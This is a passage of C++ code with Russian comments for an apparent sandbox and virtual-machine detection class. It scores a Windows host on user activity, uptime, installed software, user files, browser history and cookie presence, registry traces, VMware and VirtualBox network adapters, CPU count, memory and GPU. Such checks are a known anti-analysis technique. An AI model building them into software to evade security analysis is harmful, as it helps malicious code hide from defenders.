            LogWarning("Подозрительно мало установленного ПО");
        }
        max_score += 1;
        
        if (!CheckFileSystemArtifacts()) {
            total_score += 1;
            LogWarning("Отсутствуют следы реального использования системы");
        }
        max_score += 1;
        
        if (!CheckNetworkAdapters()) {
            total_score += 2;
            LogWarning("Обнаружены виртуальные сетевые адаптеры");
        }
        max_score += 2;
        
        if (!CheckCPUCount()) {
            total_score += 1;
            LogWarning("Подозрительно малое количество ядер процессора");
        }
        max_score += 1;
        
        if (!CheckMemoryPatterns()) {
            total_score += 1;
            LogWarning("Обнаружены подозрительные паттерны памяти");
        }
        max_score += 1;
        
        if (!CheckGPUPresence()) {
            total_score += 2;
            LogWarning("Отсутствует дискретная графическая карта");
        }
        max_score += 2;
        
        // Вычисляем уровень уверенности
        confidence_level = (total_score * 10) / max_score;
        
        if (confidence_level >= 7) {
            sandbox_detected = true;
            detection_reason = "Высокая вероятность sandbox-окружения";
            LogError(("ОБНАРУЖЕН SANDBOX! Уровень уверенности: " + std::to_string(confidence_level) + "/10").c_str());
            return false;
        } else if (confidence_level >= 4) {
            LogWarning(("Подозрительная среда выполнения. Уровень подозрений: " + std::to_string(confidence_level) + "/10").c_str());
        } else {
            LogInfo("Среда выполнения выглядит легитимной");
        }
        
        return true; // Среда безопасна
    }
    
    // Метод 1: Проверка взаимодействия с пользователем
    bool CheckUserInteraction() {
        LogDebug("Проверка активности пользователя...");
        
        // Проверяем движения мыши за последние несколько секунд
        POINT initialPos, currentPos;
        GetCursorPos(&initialPos);
        
        // Ждем 2 секунды и проверяем изменения
        Sleep(2000);
        GetCursorPos(&currentPos);
        
        bool mouse_moved = (initialPos.x != currentPos.x || initialPos.y != currentPos.y);
        
        // Проверяем состояние клавиш
        bool key_pressed = false;
        for (int vk = 0x08; vk <= 0xFE; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                key_pressed = true;
                break;
            }
        }
        
        // Проверяем последнее время активности
        LASTINPUTINFO lii;
        lii.cbSize = sizeof(LASTINPUTINFO);
        GetLastInputInfo(&lii);
        
        DWORD idle_time = GetTickCount() - lii.dwTime;
        bool recent_activity = idle_time < 60000; // Активность в последнюю минуту
        
        // Проверяем количество окон пользователя
        int window_count = 0;
        EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
            int* count = (int*)lParam;
            if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
                (*count)++;
            }
            return TRUE;
        }, (LPARAM)&window_count);
        
        bool has_user_windows = window_count > 5; // Больше 5 видимых окон
        
        LogDebug(("Результат проверки активности: движение мыши=" + std::string(mouse_moved ? "да" : "нет") + 
                 ", нажатие клавиш=" + std::string(key_pressed ? "да" : "нет") + 
                 ", недавняя активность=" + std::string(recent_activity ? "да" : "нет") +
                 ", окон пользователя=" + std::to_string(window_count)).c_str());
        
        // Считаем результат подозрительным, если нет признаков активности
        return mouse_moved || key_pressed || recent_activity || has_user_windows;
    }
    
    // Метод 2: Проверка времени работы системы
    bool CheckSystemUptime() {
        LogDebug("Проверка времени работы системы...");
        
        // Получаем время работы системы в миллисекундах
        DWORD uptime_ms = GetTickCount();
        DWORD uptime_minutes = uptime_ms / (1000 * 60);
        DWORD uptime_hours = uptime_minutes / 60;
        
        LogDebug(("Время работы системы: " + std::to_string(uptime_hours) + " часов " + 
                 std::to_string(uptime_minutes % 60) + " минут").c_str());
        
        // Дополнительная проверка через альтернативный метод
        FILETIME ft_creation, ft_exit, ft_kernel, ft_user;
        if (GetProcessTimes(GetCurrentProcess(), &ft_creation, &ft_exit, &ft_kernel, &ft_user)) {
            SYSTEMTIME st_creation;
            FileTimeToSystemTime(&ft_creation, &st_creation);
            
            SYSTEMTIME st_current;
            GetSystemTime(&st_current);
            
            // Вычисляем примерное время работы процесса
            FILETIME ft_current;
            SystemTimeToFileTime(&st_current, &ft_current);
            
            ULARGE_INTEGER creation_time, current_time;
            creation_time.LowPart = ft_creation.dwLowDateTime;
            creation_time.HighPart = ft_creation.dwHighDateTime;
            current_time.LowPart = ft_current.dwLowDateTime;
            current_time.HighPart = ft_current.dwHighDateTime;
            
            DWORD process_runtime_ms = (DWORD)((current_time.QuadPart - creation_time.QuadPart) / 10000);
            DWORD process_runtime_minutes = process_runtime_ms / (1000 * 60);
            
            LogDebug(("Время работы процесса: " + std::to_string(process_runtime_minutes) + " минут").c_str());
        }
        
        // Проверяем время последней загрузки через реестр
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Windows", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD shutdown_time;
            DWORD size = sizeof(shutdown_time);
            if (RegQueryValueExA(hKey, "ShutdownTime", NULL, NULL, (LPBYTE)&shutdown_time, &size) == ERROR_SUCCESS) {
                LogDebug("Найдено время последнего выключения в реестре");
            }
            RegCloseKey(hKey);
        }
        
        // Проверяем журналы событий для истории загрузок
        HANDLE hEventLog = OpenEventLogA(NULL, "System");
        if (hEventLog) {
            DWORD oldestRecord, numberOfRecords;
            if (GetOldestEventLogRecord(hEventLog, &oldestRecord) && 
                GetNumberOfEventLogRecords(hEventLog, &numberOfRecords)) {
                LogDebug(("Найдено " + std::to_string(numberOfRecords) + " записей в журнале событий").c_str());
                
                // Если записей очень мало, это подозрительно
                if (numberOfRecords < 100) {
                    LogWarning(("Подозрительно мало записей в журнале событий: " + std::to_string(numberOfRecords)).c_str());
                }
            }
            CloseEventLog(hEventLog);
        }
        
        // Основная проверка: если uptime меньше порогового значения
        if (uptime_ms < MIN_UPTIME_MS) {
            LogWarning(("Подозрительно низкое время работы: " + std::to_string(uptime_minutes) + 
                      " минут (минимум " + std::to_string(MIN_UPTIME_MS / (1000 * 60)) + " минут)").c_str());
            return false;
        }
        
        // Дополнительная проверка: очень большое время работы тоже подозрительно
        // (некоторые sandbox пытаются обмануть, устанавливая большое время)
        DWORD max_uptime_hours = 30 * 24; // 30 дней
        if (uptime_hours > max_uptime_hours) {
            LogWarning(("Подозрительно большое время работы: " + std::to_string(uptime_hours) + " часов").c_str());
            return false;
        }
        
        LogDebug("Время работы системы выглядит нормальным");
        return true;
    }
    
    // Метод 3: Анализ установленного программного обеспечения
    bool CheckInstalledSoftware() {
        LogDebug("Анализ установленного программного обеспечения...");
        
        int software_count = 0;
        std::vector<std::string> found_software;
        
        // Проверяем реестр для установленных программ (32-bit и 64-bit)
        std::vector<std::string> registry_paths = {
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        };
        
        for (const auto& reg_path : registry_paths) {
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_path.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                DWORD subkey_count = 0;
                RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkey_count, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                
                LogDebug(("Найдено " + std::to_string(subkey_count) + " программ в " + reg_path).c_str());
                
                // Перебираем подключи и ищем реальные программы
                for (DWORD i = 0; i < subkey_count && i < 100; i++) { // Ограничиваем для производительности
                    char subkey_name[256];
                    DWORD name_size = sizeof(subkey_name);
                    
                    if (RegEnumKeyExA(hKey, i, subkey_name, &name_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                        HKEY hSubKey;
                        std::string full_path = reg_path + "\\" + std::string(subkey_name);
                        
                        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, full_path.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                            char display_name[256] = {0};
                            DWORD value_size = sizeof(display_name);
                            
                            if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)display_name, &value_size) == ERROR_SUCCESS) {
                                if (strlen(display_name) > 3) { // Игнорируем очень короткие имена
                                    found_software.push_back(std::string(display_name));
                                    software_count++;
                                    
                                    // Проверяем наличие популярных программ
                                    std::string name_lower = std::string(display_name);
                                    std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
                                    
                                    if (name_lower.find("microsoft office") != std::string::npos ||
                                        name_lower.find("adobe") != std::string::npos ||
                                        name_lower.find("google chrome") != std::string::npos ||
                                        name_lower.find("firefox") != std::string::npos ||
                                        name_lower.find("vlc") != std::string::npos ||
                                        name_lower.find("winrar") != std::string::npos ||
                                        name_lower.find("steam") != std::string::npos) {
                                        LogDebug(("Найдена популярная программа: " + std::string(display_name)).c_str());
                                    }
                                }
                            }
                            RegCloseKey(hSubKey);
                        }
                    }
                }
                RegCloseKey(hKey);
            }
        }
        
        // Проверяем папку Program Files
        WIN32_FIND_DATAA find_data;
        HANDLE hFind;
        int program_files_count = 0;
        
        std::vector<std::string> program_dirs = {
            "C:\\Program Files\\*",
            "C:\\Program Files (x86)\\*"
        };
        
        for (const auto& dir : program_dirs) {
            hFind = FindFirstFileA(dir.c_str(), &find_data);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        std::string folder_name = find_data.cFileName;
                        if (folder_name != "." && folder_name != ".." && folder_name.length() > 2) {
                            program_files_count++;
                            LogDebug(("Найдена папка программы: " + folder_name).c_str());
                        }
                    }
                } while (FindNextFileA(hFind, &find_data) && program_files_count < 50);
                FindClose(hFind);
            }
        }
        
        // Проверяем меню "Пуск"
        char start_menu_path[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTMENU, NULL, 0, start_menu_path) == S_OK) {
            std::string search_path = std::string(start_menu_path) + "\\Programs\\*";
            int start_menu_items = 0;
            
            hFind = FindFirstFileA(search_path.c_str(), &find_data);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        start_menu_items++;
                    }
                } while (FindNextFileA(hFind, &find_data) && start_menu_items < 30);
                FindClose(hFind);
            }
            
            LogDebug(("Найдено " + std::to_string(start_menu_items) + " элементов в меню Пуск").c_str());
        }
        
        // Проверяем наличие браузеров
        bool has_browsers = false;
        std::vector<std::string> browser_paths = {
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        };
        
        for (const auto& path : browser_paths) {
            if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                has_browsers = true;
                LogDebug(("Найден браузер: " + path).c_str());
                break;
            }
        }
        
        LogInfo(("Статистика ПО: " + std::to_string(software_count) + " программ в реестре, " +
                std::to_string(program_files_count) + " папок в Program Files, браузеры " +
                (has_browsers ? "найдены" : "не найдены")).c_str());
        
        // Оценка подозрительности
        if (software_count < MIN_INSTALLED_SOFTWARE) {
            LogWarning(("Подозрительно мало установленного ПО: " + std::to_string(software_count) + 
                      " (минимум " + std::to_string(MIN_INSTALLED_SOFTWARE) + ")").c_str());
            return false;
        }
        
        if (program_files_count < 5) {
            LogWarning(("Подозрительно мало папок в Program Files: " + std::to_string(program_files_count)).c_str());
            return false;
        }
        
        if (!has_browsers) {
            LogWarning("Не найдено ни одного браузера - подозрительно для реальной системы");
            return false;
        }
        
        LogDebug("Количество установленного ПО выглядит нормальным");
        return true;
    }
    
    // Метод 4: Поиск следов реального использования файловой системы
    bool CheckFileSystemArtifacts() {
        LogDebug("Анализ артефактов файловой системы...");
        
        int total_artifacts = 0;
        
        // Проверяем папку Documents пользователя
        char documents_path[MAX_PATH];
        int documents_files = 0;
        if (SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, documents_path) == S_OK) {
            WIN32_FIND_DATAA find_data;
            std::string search_path = std::string(documents_path) + "\\*.*";
            HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        documents_files++;
                        total_artifacts++;
                    }
                } while (FindNextFileA(hFind, &find_data) && documents_files < 100);
                FindClose(hFind);
            }
        }
        
        // Проверяем папку Desktop
        char desktop_path[MAX_PATH];
        int desktop_files = 0;
        if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
            WIN32_FIND_DATAA find_data;
            std::string search_path = std::string(desktop_path) + "\\*.*";
            HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        desktop_files++;
                        total_artifacts++;
                    }
                } while (FindNextFileA(hFind, &find_data) && desktop_files < 50);
                FindClose(hFind);
            }
        }
        
        // Проверяем Recent Files (недавние файлы)
        char recent_path[MAX_PATH];
        int recent_files = 0;
        if (SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recent_path) == S_OK) {
            WIN32_FIND_DATAA find_data;
            std::string search_path = std::string(recent_path) + "\\*.*";
            HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        recent_files++;
                        total_artifacts++;
                    }
                } while (FindNextFileA(hFind, &find_data) && recent_files < 50);
                FindClose(hFind);
            }
        }
        
        // Проверяем временную папку
        char temp_path[MAX_PATH];
        int temp_files = 0;
        if (GetTempPathA(MAX_PATH, temp_path)) {
            WIN32_FIND_DATAA find_data;
            std::string search_path = std::string(temp_path) + "*.*";
            HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        temp_files++;
                    }
                } while (FindNextFileA(hFind, &find_data) && temp_files < 200);
                FindClose(hFind);
            }
        }
        
        // Проверяем историю браузера Chrome
        char appdata_path[MAX_PATH];
        int browser_artifacts = 0;
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) == S_OK) {
            std::string chrome_history = std::string(appdata_path) + "\\Google\\Chrome\\User Data\\Default\\History";
            if (GetFileAttributesA(chrome_history.c_str()) != INVALID_FILE_ATTRIBUTES) {
                browser_artifacts++;
                total_artifacts += 5; // История браузера очень важна
                LogDebug("Найдена история Chrome");
            }
            
            std::string chrome_cookies = std::string(appdata_path) + "\\Google\\Chrome\\User Data\\Default\\Cookies";
            if (GetFileAttributesA(chrome_cookies.c_str()) != INVALID_FILE_ATTRIBUTES) {
                browser_artifacts++;
                total_artifacts += 3;
                LogDebug("Найдены cookies Chrome");
            }
            
            // Firefox
            std::string firefox_profiles = std::string(appdata_path) + "\\Mozilla\\Firefox\\Profiles";
            WIN32_FIND_DATAA find_data;
            HANDLE hFind = FindFirstFileA((firefox_profiles + "\\*").c_str(), &find_data);
            if (hFind != INVALID_HANDLE_VALUE) {
                browser_artifacts++;
                total_artifacts += 3;
                LogDebug("Найдены профили Firefox");
                FindClose(hFind);
            }
        }
        
        // Проверяем кэш приложений
        int cache_artifacts = 0;
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) == S_OK) {
            std::vector<std::string> cache_dirs = {
                "\\Microsoft\\Windows\\Explorer\\thumbcache_*.db",
                "\\Microsoft\\Windows\\WebCache\\*.*",
                "\\Adobe\\*\\*",
                "\\Google\\*\\*"
            };
            
            for (const auto& cache_pattern : cache_dirs) {
                WIN32_FIND_DATAA find_data;
                std::string search_path = std::string(appdata_path) + cache_pattern;
                HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);
                if (hFind != INVALID_HANDLE_VALUE) {
                    cache_artifacts++;
                    total_artifacts += 2;
                    FindClose(hFind);
                }
            }
        }
        
        // Проверяем файлы журналов Windows
        int log_artifacts = 0;
        std::vector<std::string> log_paths = {
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "C:\\Windows\\Prefetch\\*.pf"
        };
        
        for (const auto& log_path : log_paths) {
            if (log_path.find("*") != std::string::npos) {
                WIN32_FIND_DATAA find_data;
                HANDLE hFind = FindFirstFileA(log_path.c_str(), &find_data);
                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        log_artifacts++;
                        total_artifacts++;
                    } while (FindNextFileA(hFind, &find_data) && log_artifacts < 10);
                    FindClose(hFind);
                }
            } else {
                if (GetFileAttributesA(log_path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    log_artifacts++;
                    total_artifacts += 2;
                }
            }
        }
        
        // Проверяем реестр на наличие следов использования (MRU - Most Recently Used)
        int registry_artifacts = 0;
        HKEY hKey;
        
        // RunMRU - недавно запущенные программы
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD values_count = 0;
            RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &values_count, NULL, NULL, NULL, NULL);
            if (values_count > 0) {
                registry_artifacts++;
                total_artifacts += values_count;
                LogDebug(("Найдено " + std::to_string(values_count) + " записей RunMRU").c_str());
            }
            RegCloseKey(hKey);
        }
        
        // RecentDocs - недавние документы
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD subkeys_count = 0;
            RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkeys_count, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            if (subkeys_count > 0) {
                registry_artifacts++;
                total_artifacts += subkeys_count;
                LogDebug(("Найдено " + std::to_string(subkeys_count) + " типов недавних документов").c_str());
            }
            RegCloseKey(hKey);
        }
        
        LogInfo(("Найдено артефактов: документы=" + std::to_string(documents_files) + 
                ", рабочий стол=" + std::to_string(desktop_files) + 
                ", недавние=" + std::to_string(recent_files) + 
                ", временные=" + std::to_string(temp_files) + 
                ", браузер=" + std::to_string(browser_artifacts) + 
                ", общий счет=" + std::to_string(total_artifacts)).c_str());
        
        // Оценка результатов
        if (total_artifacts < MIN_FILE_ARTIFACTS) {
            LogWarning(("Подозрительно мало файловых артефактов: " + std::to_string(total_artifacts) + 
                      " (минимум " + std::to_string(MIN_FILE_ARTIFACTS) + ")").c_str());
            return false;
        }
        
        if (documents_files == 0 && desktop_files == 0) {
            LogWarning("Полностью пустые папки пользователя - признак sandbox");
            return false;
        }
        
        if (browser_artifacts == 0) {
            LogWarning("Отсутствуют артефакты браузера - подозрительно");
            return false;
        }
        
        if (registry_artifacts == 0) {
            LogWarning("Отсутствуют следы активности в реестре - подозрительно");
            return false;
        }
        
        LogDebug("Количество файловых артефактов выглядит нормальным");
        return true;
    }
    
    // Метод 5: Анализ сетевых адаптеров
    bool CheckNetworkAdapters() {
        LogDebug("Анализ сетевых адаптеров...");
        
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);
        DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
        
        if (dwStatus != ERROR_SUCCESS) {
            LogWarning("Не удалось получить информацию о сетевых адаптерах");
            return false;
        }
        
        int physical_adapters = 0;
        int virtual_adapters = 0;
        
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        do {
            std::string adapter_desc = pAdapterInfo->Description;
            std::string adapter_name = pAdapterInfo->AdapterName;
            
            // Проверяем на виртуальные адаптеры по MAC-адресу и описанию
            bool is_virtual = false;
            
            // VMware MAC prefixes
            if ((pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x05 && pAdapterInfo->Address[2] == 0x69) ||
                (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x0C && pAdapterInfo->Address[2] == 0x29) ||
                (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x50 && pAdapterInfo->Address[2] == 0x56)) {
                is_virtual = true;
                LogWarning(("Обнаружен VMware сетевой адаптер: " + adapter_desc).c_str());
            }
            
            // VirtualBox MAC prefix
            if (pAdapterInfo->Address[0] == 0x08 && pAdapterInfo->Address[1] == 0x00 && pAdapterInfo->Address[2] == 0x27) {
                is_virtual = true;
                LogWarning(("Обнаружен VirtualBox сетевой адаптер: " + adapter_desc).c_str());
            }
            
            // Проверяем описание адаптера
            if (adapter_desc.find("VMware") != std::string::npos ||
                adapter_desc.find("VirtualBox") != std::string::npos ||
                adapter_desc.find("Virtual") != std::string::npos ||
                adapter_desc.find("TAP") != std::string::npos ||
                adapter_desc.find("Loopback") != std::string::npos) {
                is_virtual = true;
            }
            
            if (is_virtual) {
                virtual_adapters++;
            } else {
                physical_adapters++;
                LogDebug(("Найден физический адаптер: " + adapter_desc).c_str());
            }
            
            pAdapterInfo = pAdapterInfo->Next;
        } while (pAdapterInfo);
        
        LogInfo(("Сетевые адаптеры: физических=" + std::to_string(physical_adapters) + 
                ", виртуальных=" + std::to_string(virtual_adapters)).c_str());
        
        // Подозрительно, если нет физических адаптеров или слишком много виртуальных
        if (physical_adapters == 0) {
            LogWarning("Не найдено физических сетевых адаптеров");
            return false;
        }
        
        if (virtual_adapters > physical_adapters) {
            LogWarning("Виртуальных адаптеров больше чем физических");
            return false;
        }
        
        return true;
    }
    
    // Метод 6: Проверка количества ядер процессора
    bool CheckCPUCount() {
        LogDebug("Проверка конфигурации процессора...");
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        DWORD cpu_cores = sysInfo.dwNumberOfProcessors;
        
        LogDebug(("Обнаружено ядер процессора: " + std::to_string(cpu_cores)).c_str());
        
        // Дополнительная проверка через WMI/реестр
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD subkey_count = 0;
            RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkey_count, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            LogDebug(("Процессоров в реестре: " + std::to_string(subkey_count)).c_str());
            
            // Проверяем информацию о процессоре
            for (DWORD i = 0; i < subkey_count && i < 4; i++) {
                char subkey_name[32];
                DWORD name_size = sizeof(subkey_name);
                
                if (RegEnumKeyExA(hKey, i, subkey_name, &name_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                    HKEY hCpuKey;
                    std::string cpu_path = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\" + std::string(subkey_name);
                    
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, cpu_path.c_str(), 0, KEY_READ, &hCpuKey) == ERROR_SUCCESS) {
                        char processor_name[256] = {0};
                        DWORD value_size = sizeof(processor_name);
                        
                        if (RegQueryValueExA(hCpuKey, "ProcessorNameString", NULL, NULL, (LPBYTE)processor_name, &value_size) == ERROR_SUCCESS) {
                            std::string proc_name = processor_name;
                            LogDebug(("Процессор " + std::to_string(i) + ": " + proc_name).c_str());
                            
                            // Проверяем на виртуальные процессоры
                            if (proc_name.find("Virtual") != std::string::npos ||
                                proc_name.find("QEMU") != std::string::npos ||
                                proc_name.find("VMware") != std::string::npos) {
                                LogWarning(("Обнаружен виртуальный процессор: " + proc_name).c_str());
                                RegCloseKey(hCpuKey);
                                RegCloseKey(hKey);
                                return false;
                            }
                        }
                        RegCloseKey(hCpuKey);
                    }
                }
            }
            RegCloseKey(hKey);
        }
        
        if (cpu_cores < MIN_CPU_CORES) {
            LogWarning(("Подозрительно мало ядер процессора: " + std::to_string(cpu_cores) + 
                      " (минимум " + std::to_string(MIN_CPU_CORES) + ")").c_str());
            return false;
        }
        
        return true;
    }
    
    // Метод 7: Анализ паттернов памяти
    bool CheckMemoryPatterns() {
        LogDebug("Анализ конфигурации памяти...");
        
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        DWORDLONG total_memory_mb = memStatus.ullTotalPhys / (1024 * 1024);
        DWORDLONG available_memory_mb = memStatus.ullAvailPhys / (1024 * 1024);
        
        LogDebug(("Память: всего=" + std::to_string(total_memory_mb) + "MB, доступно=" + 
                std::to_string(available_memory_mb) + "MB").c_str());
        
        // Проверяем подозрительные размеры памяти (точно кратные степеням 2)
        if (total_memory_mb == 512 || total_memory_mb == 1024 || total_memory_mb == 2048 || 
            total_memory_mb == 4096 || total_memory_mb == 8192) {
            LogWarning(("Подозрительно точный размер памяти: " + std::to_string(total_memory_mb) + "MB").c_str());
            
            // Дополнительная проверка - реальные системы редко имеют точно такие размеры
            if (total_memory_mb % 512 == 0 && total_memory_mb < MIN_MEMORY_MB) {
                return false;
            }
        }
        
        // Проверяем общий объем памяти
        if (total_memory_mb < MIN_MEMORY_MB) {
            LogWarning(("Подозрительно мало оперативной памяти: " + std::to_string(total_memory_mb) + 
                      "MB (минимум " + std::to_string(MIN_MEMORY_MB) + "MB)").c_str());
            return false;
        }
        
        // Проверяем паттерны выделения виртуальной памяти
        MEMORY_BASIC_INFORMATION mbi;
        LPVOID address = 0;
        size_t allocated_regions = 0;
        size_t free_regions = 0;
        
        // Сканируем первые 100MB адресного пространства
        while ((DWORD_PTR)address < 0x6400000 && allocated_regions + free_regions < 1000) {
            SIZE_T result = VirtualQuery(address, &mbi, sizeof(mbi));
            if (result == 0) break;
            
            if (mbi.State == MEM_COMMIT) {
                allocated_regions++;
            } else if (mbi.State == MEM_FREE) {
                free_regions++;
            }
            
            address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
        }
        
        LogDebug(("Регионы памяти: выделено=" + std::to_string(allocated_regions) + 
                ", свободно=" + std::to_string(free_regions)).c_str());
        
        return true;
    }
    
    // Метод 8: Проверка наличия графического процессора
    bool CheckGPUPresence() {
        LogDebug("Проверка наличия графического процессора...");
        
        bool has_gpu = false;
        
        // Проверяем через реестр
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD subkey_count = 0;
            RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkey_count, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            
            LogDebug(("Найдено " + std::to_string(subkey_count) + " видеоустройств в реестре").c_str());
            
            for (DWORD i = 0; i < subkey_count && i < 10; i++) {
                char subkey_name[32];
                DWORD name_size = sizeof(subkey_name);
                
                if (RegEnumKeyExA(hKey, i, subkey_name, &name_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                    if (strcmp(subkey_name, "Properties") == 0) continue;
                    
                    HKEY hGpuKey;
                    std::string gpu_path = "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\" + std::string(subkey_name);
                    
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, gpu_path.c_str(), 0, KEY_READ, &hGpuKey) == ERROR_SUCCESS) {
                        char driver_desc[256] = {0};
                        DWORD value_size = sizeof(driver_desc);
                        
                        if (RegQueryValueExA(hGpuKey, "DriverDesc", NULL, NULL, (LPBYTE)driver_desc, &value_size) == ERROR_SUCCESS) {
                            std::string desc = driver_desc;
                            LogDebug(("Найдено видеоустройство: " + desc).c_str());
                            
                            // Ищем реальные GPU
                            if (desc.find("NVIDIA") != std::string::npos ||
                                desc.find("AMD") != std::string::npos ||
                                desc.find("ATI") != std::string::npos ||
                                desc.find("Intel HD") != std::string::npos ||
                                desc.find("Intel UHD") != std::string::npos ||
                                desc.find("GeForce") != std::string::npos ||
                                desc.find("Radeon") != std::string::npos) {
                                has_gpu = true;
                                LogInfo(("Найден реальный GPU: " + desc).c_str());
                            }
                            
                            // Проверяем на виртуальные GPU
                            if (desc.find("VMware") != std::string::npos ||
                                desc.find("VirtualBox") != std::string::npos ||
                                desc.find("Virtual") != std::string::npos ||
                                desc.find("Standard VGA") != std::string::npos) {
                                LogWarning(("Обнаружен виртуальный GPU: " + desc).c_str());
                            }
                        }
                        RegCloseKey(hGpuKey);
                    }
                }
            }
            RegCloseKey(hKey);
        }
        
        // Дополнительная проверка через Device Manager
        HKEY hDevKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Enum\\PCI", 0, KEY_READ, &hDevKey) == ERROR_SUCCESS) {
            DWORD pci_devices = 0;
            RegQueryInfoKeyA(hDevKey, NULL, NULL, NULL, &pci_devices, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            LogDebug(("Найдено " + std::to_string(pci_devices) + " PCI устройств").c_str());
            
            // Много PCI устройств = признак реальной системы
            if (pci_devices > 20) {
                has_gpu = true; // Косвенный признак
            }
            RegCloseKey(hDevKey);
        }
        
        if (!has_gpu) {
            LogWarning("Не найдено дискретных графических процессоров - признак sandbox");
            return false;
        }
        
        LogDebug("Конфигурация GPU выглядит нормальной");
        return true;
    }
    
    // Getters для результатов
    bool IsSandboxDetected() const { return sandbox_detected; }
    std::string GetDetectionReason() const { return detection_reason; }
